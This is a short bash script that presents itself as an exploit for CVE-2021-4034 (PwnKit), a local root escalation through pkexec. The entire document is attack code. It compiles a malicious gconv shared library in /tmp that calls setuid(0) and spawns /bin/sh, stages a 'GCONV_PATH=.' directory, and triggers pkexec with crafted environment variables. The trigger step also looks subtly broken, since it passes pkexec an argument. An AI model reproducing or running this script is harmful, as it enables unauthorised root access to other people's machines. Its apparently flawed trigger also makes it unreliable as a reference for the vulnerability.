#!/bin/bash
cd "$(dirname "$0")"
echo "[*] CVE-2021-4034 PwnKit"
echo "[*] Checking pkexec..."
if [ ! -u /usr/bin/pkexec ];then echo "[-] pkexec not SUID";exit 1;fi
echo "[+] pkexec is SUID"
echo "[*] Compiling..."
cat > /tmp/.pwnkit.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv(){}
void gconv_init(){setuid(0);setgid(0);seteuid(0);setegid(0);system("/bin/sh");}
EOF
gcc -shared -fPIC -o /tmp/pwnkit.so /tmp/.pwnkit.c 2>/dev/null
if [ ! -f /tmp/pwnkit.so ];then echo "[-] Compile failed";exit 1;fi
mkdir -p '/tmp/pwnkit/GCONV_PATH=.'
touch '/tmp/pwnkit/GCONV_PATH=./pwnkit'
chmod +x '/tmp/pwnkit/GCONV_PATH=./pwnkit'
cat > /tmp/pwnkit/gconv-modules << 'EOF'
module UTF-8// PWNKIT// pwnkit 1
EOF
cp /tmp/pwnkit.so /tmp/pwnkit/
echo "[+] Ready"
echo "[*] Triggering..."
cd /tmp/pwnkit
PATH=.:$PATH CHARSET=PWNKIT SHELL=/tmp/pwnkit pkexec /bin/true 2>/dev/null
